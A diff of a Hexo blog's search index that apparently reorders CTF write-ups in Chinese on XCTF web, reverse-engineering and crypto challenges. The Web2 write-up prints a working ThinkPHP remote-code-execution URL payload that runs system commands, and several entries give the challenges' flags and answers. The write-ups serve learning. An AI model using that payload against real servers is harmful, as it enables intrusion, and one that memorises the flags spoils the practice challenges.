@@ -4,25 +4,6 @@
   
     
     <entry>
-      <title>Web2</title>
-      <link href="/lunan0320.github.io/2021/01/17/web2/"/>
-      <url>/lunan0320.github.io/2021/01/17/web2/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h4 id="题目来源：XCTF-Web-进阶区-php-rce"><a href="#题目来源：XCTF-Web-进阶区-php-rce" class="headerlink" title="题目来源：XCTF Web 进阶区 php_rce"></a><strong>题目来源：XCTF Web 进阶区 php_rce</strong></h4><p>打开场景文件后，看到题目的提示是ThinkPHP，查资料后可知，这是一个远程代码执行漏洞，查一下网上的payload后，尝试输入</p><p><img src="/lunan0320.github.io/2021/01/17/web2/1.png"></p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//your-ip:8080/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span></code></pre><p>返回的结果是：</p><p>​    <img src="/lunan0320.github.io/2021/01/17/web2/2.png"></p><p>同样，在比较了很多的较为繁琐的解决方法后，我找到了一种适合该题的一种较为简单的方法。</p><p>我们可以根据在linux系统下的命令行输入语法来执行此过程寻找flag，可以有更方便的查找文件的命令：</p><pre class=" language-php"><code class="language-php">find <span class="token operator">/</span> <span class="token operator">-</span>name <span class="token string">"*flag*"</span></code></pre><p>此时可以输入：</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\<span class="token package">think<span class="token punctuation">\</span>app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag</code></pre><p>作为后缀，来寻找flag</p><p>查找结果如图：</p><p><img src="/lunan0320.github.io/2021/01/17/web2/3.png"></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Web </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Web1</title>
       <link href="/lunan0320.github.io/2021/01/17/web1/"/>
       <url>/lunan0320.github.io/2021/01/17/web1/</url>
@@ -34,82 +15,6 @@
         <tags>
             
             <tag> Web </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>re5</title>
-      <link href="/lunan0320.github.io/2021/01/17/re5/"/>
-      <url>/lunan0320.github.io/2021/01/17/re5/</url>
-      
-        <content type="html"><![CDATA[<h1 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h1><p>​    题目来源：XCTF Shuffle</p><p>​    运行程序发现在IDA中调试时候是一个32位的程序，需要在IDA32中打开</p><p><img src="/lunan0320.github.io/2021/01/17/re5/1.png"></p><p>​    看到后尝试反编译</p><p><img src="/lunan0320.github.io/2021/01/17/re5/2.png"></p><p>​    观察汇编代码，根据题目的提示信息可以看到，乱码的原因是因为v5和v6是随机生成的两个数，并且每次都将v5和v6的字符交换</p><p>​    所以直接将伪代码中的16进制字符转换为字符即可</p><p><img src="/lunan0320.github.io/2021/01/17/re5/3.png"></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Reverse </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Crypto4</title>
-      <link href="/lunan0320.github.io/2021/01/17/crypto4/"/>
-      <url>/lunan0320.github.io/2021/01/17/crypto4/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Crypto4"><a href="#Crypto4" class="headerlink" title="Crypto4"></a>Crypto4</h1><p>题目来源：XCTF 不仅仅是Morse</p><p><img src="/lunan0320.github.io/2021/01/17/crypto4/1.png"></p><p>​    首先看到题目是morse密码的格式，直接在线解密工具</p><p><img src="/lunan0320.github.io/2021/01/17/crypto4/2.png"></p><p>​    观察破解出来的后半部分，只有A和B两个组成，通过这个特征，容易想到培根密码的形式</p><p>AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</p><p>​    在线培根密码对后半部分解密之后可以得到结果：</p><p><img src="/lunan0320.github.io/2021/01/17/crypto4/3.png"></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Crypto </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>re4</title>
-      <link href="/lunan0320.github.io/2021/01/17/re4/"/>
-      <url>/lunan0320.github.io/2021/01/17/re4/</url>
-      
-        <content type="html"><![CDATA[<h1 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h1><p>​    题目来源：XCTF  re4-unvm-me</p><p>​    下载文件后发现这是一个pyc文件，对pyc文件解码后生成的是一个pytc_dis文件</p><p><img src="/lunan0320.github.io/2021/01/17/re4/1.png"></p><p>​    使用notepad++打开之后，解出了c的代码，可以看到是md5的加密过程。</p><p><img src="/lunan0320.github.io/2021/01/17/re4/2.png"></p><p>​    观察代码，可以看出我们的输入必须小于69且是5的倍数。for循环语句里的内容是将输入5个5个分为一组，每5个进行一次md5变换，得到的值和md5s数组中相应的元素进行比较，全部相等即可。</p><p>​    找到在线解密网站依次解密可得：</p><p>ALEXCTF{dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k}</p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Reverse </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>re3</title>
-      <link href="/lunan0320.github.io/2021/01/17/re3/"/>
-      <url>/lunan0320.github.io/2021/01/17/re3/</url>
-      
-        <content type="html"><![CDATA[<h1 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h1><p>题目描述：md5😵</p><p>题目来源：XCTF -reverse</p><p>首先看到题目会想到是md5的加密，打开main函数</p><p><img src="/lunan0320.github.io/2021/01/17/re3/1.png"></p><p>看到核心部分，确实是md5的加密过程，从if 的判断条件可以得到加密后的密文</p><p><img src="/lunan0320.github.io/2021/01/17/re3/2.png"></p><p>据此，我们可以写出代码来求出真实的密文</p><p><img src="/lunan0320.github.io/2021/01/17/re3/3.png"></p><p>得到的密文结果是：780438d5b6e29db0898bc4f0225935c0</p><p><img src="/lunan0320.github.io/2021/01/17/re3/4.png"></p><p>本以为可以直接解密成功，结果一直卡在这里，发现这个是对md5的二次加密😭😭😭</p><p>并且可以知道，彻底解密后的结果是grape，但是我们的flag应该是对grape的一次加密</p><p>因此，在线加密md5的grape明文</p><p><img src="/lunan0320.github.io/2021/01/17/re3/5.png"></p><p>得到的加密值：b781cbb29054db12f88f08c6e161c199</p><p>此即为最终flag的结果。</p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Reverse </tag>
             
         </tags>
       
@@ -137,11 +42,119 @@
     
     
     <entry>
-      <title>Crypto3</title>
-      <link href="/lunan0320.github.io/2021/01/17/crypto3/"/>
-      <url>/lunan0320.github.io/2021/01/17/crypto3/</url>
+      <title>Hello World</title>
+      <link href="/lunan0320.github.io/2021/01/17/hello-world/"/>
+      <url>/lunan0320.github.io/2021/01/17/hello-world/</url>
       
-        <content type="html"><![CDATA[<h1 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h1><p>Easychallenge wp😊</p><p>题目来源：攻防世界—crypto  </p><p>下载附件，我们发现是一个.pyc文件，我们找个在线反编译网站，反编译出如下python代码：</p><p><img src="/lunan0320.github.io/2021/01/17/crypto3/1.png"></p><p>然后理清变换过程，写出得到flag的程序，就可以的到flag了。</p>]]></content>
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>re5</title>
+      <link href="/lunan0320.github.io/2021/01/11/re5/"/>
+      <url>/lunan0320.github.io/2021/01/11/re5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h1><p>​    题目来源：XCTF Shuffle</p><p>​    运行程序发现在IDA中调试时候是一个32位的程序，需要在IDA32中打开</p><p><img src="/lunan0320.github.io/2021/01/11/re5/1.png"></p><p>​    看到后尝试反编译</p><p><img src="/lunan0320.github.io/2021/01/11/re5/2.png"></p><p>​    观察汇编代码，根据题目的提示信息可以看到，乱码的原因是因为v5和v6是随机生成的两个数，并且每次都将v5和v6的字符交换</p><p>​    所以直接将伪代码中的16进制字符转换为字符即可</p><p><img src="/lunan0320.github.io/2021/01/11/re5/3.png"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Reverse </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>re4</title>
+      <link href="/lunan0320.github.io/2021/01/11/re4/"/>
+      <url>/lunan0320.github.io/2021/01/11/re4/</url>
+      
+        <content type="html"><![CDATA[<h1 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h1><p>​    题目来源：XCTF  re4-unvm-me</p><p>​    下载文件后发现这是一个pyc文件，对pyc文件解码后生成的是一个pytc_dis文件</p><p><img src="/lunan0320.github.io/2021/01/11/re4/1.png"></p><p>​    使用notepad++打开之后，解出了c的代码，可以看到是md5的加密过程。</p><p><img src="/lunan0320.github.io/2021/01/11/re4/2.png"></p><p>​    观察代码，可以看出我们的输入必须小于69且是5的倍数。for循环语句里的内容是将输入5个5个分为一组，每5个进行一次md5变换，得到的值和md5s数组中相应的元素进行比较，全部相等即可。</p><p>​    找到在线解密网站依次解密可得：</p><p>ALEXCTF{dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k}</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Reverse </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>re3</title>
+      <link href="/lunan0320.github.io/2021/01/09/re3/"/>
+      <url>/lunan0320.github.io/2021/01/09/re3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h1><p>题目描述：md5😵</p><p>题目来源：XCTF -reverse</p><p>首先看到题目会想到是md5的加密，打开main函数</p><p><img src="/lunan0320.github.io/2021/01/09/re3/1.png"></p><p>看到核心部分，确实是md5的加密过程，从if 的判断条件可以得到加密后的密文</p><p><img src="/lunan0320.github.io/2021/01/09/re3/2.png"></p><p>据此，我们可以写出代码来求出真实的密文</p><p><img src="/lunan0320.github.io/2021/01/09/re3/3.png"></p><p>得到的密文结果是：780438d5b6e29db0898bc4f0225935c0</p><p><img src="/lunan0320.github.io/2021/01/09/re3/4.png"></p><p>本以为可以直接解密成功，结果一直卡在这里，发现这个是对md5的二次加密😭😭😭</p><p>并且可以知道，彻底解密后的结果是grape，但是我们的flag应该是对grape的一次加密</p><p>因此，在线加密md5的grape明文</p><p><img src="/lunan0320.github.io/2021/01/09/re3/5.png"></p><p>得到的加密值：b781cbb29054db12f88f08c6e161c199</p><p>此即为最终flag的结果。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Reverse </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Crypto4</title>
+      <link href="/lunan0320.github.io/2021/01/09/crypto4/"/>
+      <url>/lunan0320.github.io/2021/01/09/crypto4/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Crypto4"><a href="#Crypto4" class="headerlink" title="Crypto4"></a>Crypto4</h1><p>题目来源：XCTF 不仅仅是Morse</p><p><img src="/lunan0320.github.io/2021/01/09/crypto4/1.png"></p><p>​    首先看到题目是morse密码的格式，直接在线解密工具</p><p><img src="/lunan0320.github.io/2021/01/09/crypto4/2.png"></p><p>​    观察破解出来的后半部分，只有A和B两个组成，通过这个特征，容易想到培根密码的形式</p><p>AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</p><p>​    在线培根密码对后半部分解密之后可以得到结果：</p><p><img src="/lunan0320.github.io/2021/01/09/crypto4/3.png"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Crypto </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web2</title>
+      <link href="/lunan0320.github.io/2021/01/01/web2/"/>
+      <url>/lunan0320.github.io/2021/01/01/web2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h4 id="题目来源：XCTF-Web-进阶区-php-rce"><a href="#题目来源：XCTF-Web-进阶区-php-rce" class="headerlink" title="题目来源：XCTF Web 进阶区 php_rce"></a><strong>题目来源：XCTF Web 进阶区 php_rce</strong></h4><p>打开场景文件后，看到题目的提示是ThinkPHP，查资料后可知，这是一个远程代码执行漏洞，查一下网上的payload后，尝试输入</p><p><img src="/lunan0320.github.io/2021/01/01/web2/1.png"></p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//your-ip:8080/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span></code></pre><p>返回的结果是：</p><p>​    <img src="/lunan0320.github.io/2021/01/01/web2/2.png"></p><p>同样，在比较了很多的较为繁琐的解决方法后，我找到了一种适合该题的一种较为简单的方法。</p><p>我们可以根据在linux系统下的命令行输入语法来执行此过程寻找flag，可以有更方便的查找文件的命令：</p><pre class=" language-php"><code class="language-php">find <span class="token operator">/</span> <span class="token operator">-</span>name <span class="token string">"*flag*"</span></code></pre><p>此时可以输入：</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\<span class="token package">think<span class="token punctuation">\</span>app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag</code></pre><p>作为后缀，来寻找flag</p><p>查找结果如图：</p><p><img src="/lunan0320.github.io/2021/01/01/web2/3.png"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Crypto3</title>
+      <link href="/lunan0320.github.io/2021/01/01/crypto3/"/>
+      <url>/lunan0320.github.io/2021/01/01/crypto3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h1><p>Easychallenge wp😊</p><p>题目来源：攻防世界—crypto  </p><p>下载附件，我们发现是一个.pyc文件，我们找个在线反编译网站，反编译出如下python代码：</p><p><img src="/lunan0320.github.io/2021/01/01/crypto3/1.png"></p><p>然后理清变换过程，写出得到flag的程序，就可以的到flag了。</p>]]></content>
       
       
       
@@ -157,10 +170,10 @@
     
     <entry>
       <title>re2</title>
-      <link href="/lunan0320.github.io/2021/01/17/re2/"/>
-      <url>/lunan0320.github.io/2021/01/17/re2/</url>
+      <link href="/lunan0320.github.io/2020/12/28/re2/"/>
+      <url>/lunan0320.github.io/2020/12/28/re2/</url>
       
-        <content type="html"><![CDATA[<h1 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h1><p><img src="/lunan0320.github.io/2021/01/17/re2/1.png"></p><p>​    进入ida调试，依次分析三个主函数，第一个函数深度挖掘发现是一个输入函数，第二个慢慢发现只是一个测长度的函数，容易发现第三个才是主要的函数</p><p>  <img src="/lunan0320.github.io/2021/01/17/re2/2.png"></p><p>​    进入分析第三个，发现到最后的一个函数是主要的判断和输出正确结果的函数</p><p><img src="/lunan0320.github.io/2021/01/17/re2/3.png"></p><p>  依次查看，发现第一个是进行的大小写转换的操作，第二个则是用一种另外的操作，第三个是一个换表，第四个是大小写转换。</p><p><img src="/lunan0320.github.io/2021/01/17/re2/4.png"></p><p>  对于base换表根据txt文件种的原始值换表后，写出代码</p><p><img src="/lunan0320.github.io/2021/01/17/re2/5.png"></p><p>最后输出的结果是7ea10b5233a85059a4feb250dc552703</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h1><p><img src="/lunan0320.github.io/2020/12/28/re2/1.png"></p><p>​    进入ida调试，依次分析三个主函数，第一个函数深度挖掘发现是一个输入函数，第二个慢慢发现只是一个测长度的函数，容易发现第三个才是主要的函数</p><p>  <img src="/lunan0320.github.io/2020/12/28/re2/2.png"></p><p>​    进入分析第三个，发现到最后的一个函数是主要的判断和输出正确结果的函数</p><p><img src="/lunan0320.github.io/2020/12/28/re2/3.png"></p><p>  依次查看，发现第一个是进行的大小写转换的操作，第二个则是用一种另外的操作，第三个是一个换表，第四个是大小写转换。</p><p><img src="/lunan0320.github.io/2020/12/28/re2/4.png"></p><p>  对于base换表根据txt文件种的原始值换表后，写出代码</p><p><img src="/lunan0320.github.io/2020/12/28/re2/5.png"></p><p>最后输出的结果是7ea10b5233a85059a4feb250dc552703</p>]]></content>
       
       
       
@@ -176,10 +189,10 @@
     
     <entry>
       <title>re1</title>
-      <link href="/lunan0320.github.io/2021/01/17/re1/"/>
-      <url>/lunan0320.github.io/2021/01/17/re1/</url>
+      <link href="/lunan0320.github.io/2020/12/27/re1/"/>
+      <url>/lunan0320.github.io/2020/12/27/re1/</url>
       
-        <content type="html"><![CDATA[<h1 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h1><p>​    先拖到die中发现是32位文件，然后同ida32位打开，找到main函数，直接f5反编译，发现了几个函数， 点进这个 sub_4015B0(&amp;v5, strlen((const char *)&amp;v5), &amp;v6, &amp;v4)函数发现是对输入的值进行处理，然后判断v6的值与5GRB5XNU6jlT3TlT3WpB8W0WtldF+msR42ZH5yld是否相同，由此可知我们只需将5GRB5XNU6jlT3TlT3WpB8W0WtldF+msR42ZH5yld变换回去就可以的到flag。</p><p><img src="/lunan0320.github.io/2021/01/17/re1/1.png"></p><p>​    点进这个sub_401500(aAbcdefghijklmn)函数我们发现是对aAbcdefghijklmn的一些操作，然后看他的汇编代码我们会发现有一个表，猜测是用base64进行处理的，而且对表进行操作过，就可以知道进行了就可以直到进行了换表操作。</p><p><img src="/lunan0320.github.io/2021/01/17/re1/2.png"></p><p>  然后我们对其进行调试在执行换表操作的下一个语句设置断点，调试完成后我们会到那个表的位置发现表换成了ghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef这个，然会我们写个脚本把5GRB5XNU6jlT3TlT3WpB8W0WtldF+msR42ZH5yld换成标准的base64生成的值，然后找个base64的解密网站破解一下就可以得到flag。</p><p>  <img src="/lunan0320.github.io/2021/01/17/re1/3.png"></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h1><p>​    先拖到die中发现是32位文件，然后同ida32位打开，找到main函数，直接f5反编译，发现了几个函数， 点进这个 sub_4015B0(&amp;v5, strlen((const char *)&amp;v5), &amp;v6, &amp;v4)函数发现是对输入的值进行处理，然后判断v6的值与5GRB5XNU6jlT3TlT3WpB8W0WtldF+msR42ZH5yld是否相同，由此可知我们只需将5GRB5XNU6jlT3TlT3WpB8W0WtldF+msR42ZH5yld变换回去就可以的到flag。</p><p><img src="/lunan0320.github.io/2020/12/27/re1/1.png"></p><p>​    点进这个sub_401500(aAbcdefghijklmn)函数我们发现是对aAbcdefghijklmn的一些操作，然后看他的汇编代码我们会发现有一个表，猜测是用base64进行处理的，而且对表进行操作过，就可以知道进行了就可以直到进行了换表操作。</p><p><img src="/lunan0320.github.io/2020/12/27/re1/2.png"></p><p>  然后我们对其进行调试在执行换表操作的下一个语句设置断点，调试完成后我们会到那个表的位置发现表换成了ghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef这个，然会我们写个脚本把5GRB5XNU6jlT3TlT3WpB8W0WtldF+msR42ZH5yld换成标准的base64生成的值，然后找个base64的解密网站破解一下就可以得到flag。</p><p>  <img src="/lunan0320.github.io/2020/12/27/re1/3.png"></p>]]></content>
       
       
       
@@ -195,10 +208,10 @@
     
     <entry>
       <title>Crypto2</title>
-      <link href="/lunan0320.github.io/2021/01/17/crypto2/"/>
-      <url>/lunan0320.github.io/2021/01/17/crypto2/</url>
+      <link href="/lunan0320.github.io/2020/12/22/crypto2/"/>
+      <url>/lunan0320.github.io/2020/12/22/crypto2/</url>
       
-        <content type="html"><![CDATA[<h1 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h1><blockquote><pre class=" language-c"><code class="language-c"><span class="token operator">></span> <span class="token number">20007978758166309930265697614982513218273073454928983660048528331097010828958096468299776488744993182315936148627876851809422331280471073551417956563668197068676126722734534188127471611402864677938887115908916553544845110143563736559450970252229445667691496767868123951081712872604935508183737147849971835008184807472987711316180320099624812832405397468923025162496735247263616654895797084799784974584932678025655358910480843010221725985491740823985360121695310692419773463141212113933823487148306326402421665145808422963033346161969635009951581265915013730077344870284008003690168143322781170105437085918993663</span><span class="token operator">></span><span class="token operator">></span> c <span class="token operator">=</span> <span class="token number">0x10652CDFAA8D984F5B582D65A9357ADA464CA4E9BF0C3914A5AD2DC291D9EC8310E9BFF83E4B0545B61806A4FC0DAC3FCA5A0917D98052320317208292B6F4B472AA032D4E48CFFEAFF387A44F7FCDD91DC103BB2B9C66FFA987C4A3E038F65C46CC66A00965</span><span class="token operator">></span><span class="token operator">></span> e <span class="token operator">=</span> <span class="token number">3</span></code></pre></blockquote><p>根据此可以写出脚本：</p><p><img src="/lunan0320.github.io/2021/01/17/crypto2/1.png" alt="1"></p><p>​    </p><p>输入相关数据</p><p>得到flag{you_are_clever_than_i_thount}</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h1><blockquote><pre class=" language-c"><code class="language-c"><span class="token operator">&gt;</span> <span class="token number">20007978758166309930265697614982513218273073454928983660048528331097010828958096468299776488744993182315936148627876851809422331280471073551417956563668197068676126722734534188127471611402864677938887115908916553544845110143563736559450970252229445667691496767868123951081712872604935508183737147849971835008184807472987711316180320099624812832405397468923025162496735247263616654895797084799784974584932678025655358910480843010221725985491740823985360121695310692419773463141212113933823487148306326402421665145808422963033346161969635009951581265915013730077344870284008003690168143322781170105437085918993663</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span> c <span class="token operator">=</span> <span class="token number">0x10652CDFAA8D984F5B582D65A9357ADA464CA4E9BF0C3914A5AD2DC291D9EC8310E9BFF83E4B0545B61806A4FC0DAC3FCA5A0917D98052320317208292B6F4B472AA032D4E48CFFEAFF387A44F7FCDD91DC103BB2B9C66FFA987C4A3E038F65C46CC66A00965</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span> e <span class="token operator">=</span> <span class="token number">3</span></code></pre></blockquote><p>根据此可以写出脚本：</p><p><img src="/lunan0320.github.io/2020/12/22/crypto2/1.png" alt="1"></p><p>​    </p><p>输入相关数据</p><p>得到flag{you_are_clever_than_i_thount}</p>]]></content>
       
       
       
@@ -214,10 +227,10 @@
     
     <entry>
       <title>Crypto1</title>
-      <link href="/lunan0320.github.io/2021/01/17/crypto1/"/>
-      <url>/lunan0320.github.io/2021/01/17/crypto1/</url>
+      <link href="/lunan0320.github.io/2020/12/21/crypto1/"/>
+      <url>/lunan0320.github.io/2020/12/21/crypto1/</url>
       
-        <content type="html"><![CDATA[<h1 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h1><p>题目来源：XCTF</p><p><img src="/lunan0320.github.io/2021/01/17/crypto1/1.png"></p><blockquote><p>首先对N分解</p><p>可以得到p和q</p><p>q = 366669102002966856876605669837014229419</p><p>p = 282164587459512124844245113950593348271</p><p>然后就写脚本来解密</p></blockquote>]]></content>
+        <content type="html"><![CDATA[<h1 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h1><p>题目来源：XCTF</p><p><img src="/lunan0320.github.io/2020/12/21/crypto1/1.png"></p><blockquote><p>首先对N分解</p><p>可以得到p和q</p><p>q = 366669102002966856876605669837014229419</p><p>p = 282164587459512124844245113950593348271</p><p>然后就写脚本来解密</p></blockquote>]]></content>
       
       
       
@@ -226,19 +239,6 @@
             <tag> Crypto </tag>
             
         </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/lunan0320.github.io/2021/01/17/hello-world/"/>
-      <url>/lunan0320.github.io/2021/01/17/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-      
-      
       
     </entry>
     
